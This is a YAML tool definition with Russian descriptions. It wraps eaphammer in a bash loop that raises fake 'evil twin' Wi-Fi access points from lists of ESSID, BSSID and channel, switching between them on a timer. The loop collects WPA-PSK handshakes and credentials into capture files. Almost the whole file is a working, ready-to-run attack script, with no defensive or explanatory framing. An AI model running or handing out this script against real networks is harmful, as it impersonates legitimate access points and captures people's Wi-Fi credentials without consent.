description: |- 
  Поднимает поддельные точки доступа по таймауту

  ВНИМАНИЕ! Любое внешнее логирование судя по всему ломает eaphammer - и встроенные функции bshm, и tee... Мистика!
tags:
  - wpa-psk
  - evil twin
  - handshake

arguments:
  interface:
    description: имя интерфейса wlan
  list:
    description: 'файлы со списками параметров точек доступа в формате "ESSID;BSSID;CHANNEL" (например: "FakeAP;2f:db:4c:70:74:74;8")'
    multiple: true
    replacer: '#list#'
  t:
    description: время в секундах для переключения между точками
    default: 30
    replacer: '#timeout#'
    metavar: SECONDS
    regex: '[0-9]+'
  d:
    description: директория, куда скрипт будет складывать .cap файлы (их будет много!)
    default: 'etwin-pulsar'
    replacer: '#dir#'
    metavar: DIRECTORY

mode:
  format:
    interface: '{!r}'
    list: '{!r}'
    t: '{}s'

shell: bash

script: >-
  interface=#interface#;
  outdir=#dir#;
  mkdir -p $outdir;
  while true; do
  for ap in $(cat #list# | sort -u | sort -R); do
  sudo ip link set $interface down;
  sudo iw $interface set type managed;
  sudo ip link set $interface up;
  sudo nmcli dev set $interface managed yes;
  sudo timeout -s INT -k 15s #timeout# eaphammer --interface $interface --essid $(echo $ap | awk -F ';' '{print $1}') --auth wpa-psk --password 00000000 --creds --psk-capture-file "$(realpath $outdir/etwin-pulsar-$(date +%Y%m%d%H%M%S).cap)" --bssid $(echo $ap | awk -F ';' '{print $2}') --channel $(echo $ap | awk -F ';' '{print $3}');
  trap exit SIGINT;
  echo; echo "Press CTRL+C to exit";
  for i in 5 4 3 2 1; do echo -n "$i... "; sleep 1; done; echo;
  done;
  done
  